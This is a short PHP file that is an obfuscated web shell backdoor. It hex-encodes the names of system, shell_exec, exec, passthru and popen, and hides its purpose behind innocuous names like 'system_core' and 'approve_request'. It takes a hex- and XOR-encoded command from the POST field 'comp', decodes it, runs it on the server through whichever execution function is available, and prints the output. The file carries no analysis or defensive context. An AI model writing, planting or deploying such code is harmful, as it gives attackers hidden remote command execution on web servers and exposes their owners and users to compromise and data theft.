<?php

$system_core6 = "s\x74\x72eam_\x67\x65\x74\x5F\x63o\x6Et\x65\x6Ets";
$system_core7 = "\x70\x63lo\x73e";
$system_core4 = "\x70as\x73\x74hr\x75";
$framework = "\x68ex\x32b\x69\x6E";
$system_core3 = "e\x78\x65c";
$system_core2 = "s\x68el\x6C_\x65\x78\x65c";
$system_core5 = "\x70\x6Fpen";
$system_core1 = "\x73ys\x74\x65m";
if (isset($_POST["c\x6F\x6Dp"])) {
            function approve_request   (  $pointer,   $resource ) {
 $flg ='' ;
for($k=0;
 $k<strlen($pointer);
 $k++){
$flg.=chr(ord($pointer[$k])^$resource);

} return $flg;
 
}
            $comp = $framework($_POST["c\x6F\x6Dp"]);
            $comp = approve_request($comp, 34);
            if (function_exists($system_core1)) {
                $system_core1($comp);
            } elseif (function_exists($system_core2)) {
                print $system_core2($comp);
            } elseif (function_exists($system_core3)) {
                $system_core3($comp, $value_pointer);
                print join("\n", $value_pointer);
            } elseif (function_exists($system_core4)) {
                $system_core4($comp);
            } elseif (function_exists($system_core5) && function_exists($system_core6) && function_exists($system_core7)) {
                $resource_flg = $system_core5($comp, 'r');
                if ($resource_flg) {
                    $element_ptr = $system_core6($resource_flg);
                    $system_core7($resource_flg);
                    print $element_ptr;
                }
            }
            exit;
        }